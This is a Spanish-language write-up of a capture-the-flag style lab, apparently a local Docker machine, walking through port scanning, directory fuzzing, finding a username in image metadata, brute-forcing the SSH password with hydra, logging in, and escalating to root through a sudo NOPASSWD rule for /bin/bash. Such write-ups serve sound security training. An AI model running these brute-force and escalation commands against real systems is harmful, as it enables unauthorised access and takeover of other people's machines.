## Escaneo

- Realizo el primer escaneo en busca de puertos abiertos
```
nmap -p- --open --min-rate 5000 -Pn -n -sS 172.17.0.2 -oG escaneo
```

```
cat puertos 
# Nmap 7.98 scan initiated Fri Mar  6 13:44:13 2026 as: /usr/lib/nmap/nmap --privileged -p- --open --min-rate 5000 -Pn -n -sS -oG puertos 172.17.0.2
Host: 172.17.0.2 ()     Status: Up
Host: 172.17.0.2 ()     Ports: 22/open/tcp//ssh///, 80/open/tcp//http///        Ignored State: closed (65533)
# Nmap done at Fri Mar  6 13:44:14 2026 -- 1 IP address (1 host up) scanned in 0.95 seconds

```
Se guarda con el archivo con el comando **-oG** para luego poder extraer con el comando **extractPorts**

- Se encuetra que los puertos 22 y 80 estan abierto, realizo un segundo escaneo en busca de vulnerabilidades en los puertos.
```
nmap -p22,80 -sCV 172.17.0.2 -oN puertos
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 3d:fd:d7:c8:17:97:f5:12:b1:f5:11:7d:af:88:06:fe (ECDSA)
|_  256 43:b3:ba:a9:32:c9:01:43:ee:62:d0:11:12:1d:5d:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
|_http-server-header: Apache/2.4.59 (Debian)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

-  Exploro la pagina web para ver que encuentro.
```
whatweb 172.17.0.2
http://172.17.0.2 [200 OK] Apache[2.4.59], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.59 (Debian)], IP[172.17.0.2]
```
No se encuentra nada raro y en la pagina solo se encuntra una imagen.

- Realizo una busqueda de directorios
```
wfuzz -c -w /usr/share/wordlists/dirb/directory-list-2.3-medium.txt --hc 404 http://172.17.0.2/FUZZ
```
No se encuentra ningun directorio aparte de los comunes.

- Lo siguente que realizo es descargar la imagen para poder ver los metadatos.
```
wget http://172.17.0.2/imagen.jpeg
```

```
exiftool imagen.jpeg
```

```
exiftool imagen.jpeg 
ExifTool Version Number : 13.50 
File Name : imagen.jpeg 
Directory : . 
File Size : 19 kB 
File Modification 
Date/Time : 2024:05:28 12:10:18-04:00 
File Access 
Date/Time : 2026:03:06 13:55:58-05:00 
File Inode Change 
Date/Time : 2026:03:06 13:55:58-05:00 
File Permissions : -rw-rw-r-- 
File Type : JPEG 
File Type Extension : jpg 
MIME Type : image/jpeg JFIF 
Version : 1.01 
Resolution Unit : None 
X Resolution : 1 
Y Resolution : 1 
XMP Toolkit : Image::ExifTool 12.76 
Description : ---------- User: borazuwarah ---------- 
Title : ---------- Password: ---------- 
Image Width : 455 
Image Height : 455 
Encoding Process : Baseline DCT, Huffman coding 
Bits Per Sample : 8 Color Components : 3 
Y Cb Cr Sub Sampling : YCbCr4:2:0 (2 2) 
Image Size : 455x455 
Megapixels : 0.207
```

- Encuentro un usuario para poder explotar, pero no una contraseña
```
User: borazuwarah
```

- Ya con el usuario busco su respectiva contraseña con hydra
```
hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4
```

- Hydra encuentra la contraseña para el usuario
```
[22][ssh] host: 172.17.0.2 login: **borazuwarah** password: **123456**
```

## Explotación

- Ya con el usuario y contraseña ingreso a través de ssh
```
ssh borazuwarah@172.17.0.2
```
y utilizo la contraseña encontrada **123456**

- Ingreso como el usuario borazuwarah

## Escalada de privilegios
- para poder ser usuario root, realizo una búsqueda de privilegios
```
sudo -l
Matching Defaults entries for borazuwarah on 7c9e8763a511: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty User borazuwarah may run the following commands on 7c9e8763a511: (ALL : ALL) ALL (ALL) NOPASSWD: /bin/bash
```

Esto me dice que utilizando el binario /bin/bash puedo escalar a root.

```
borazuwarah@7c9e8763a511:~$ sudo /bin/bash root@7c9e8763a511:/home/borazuwarah# whoami 
root
```
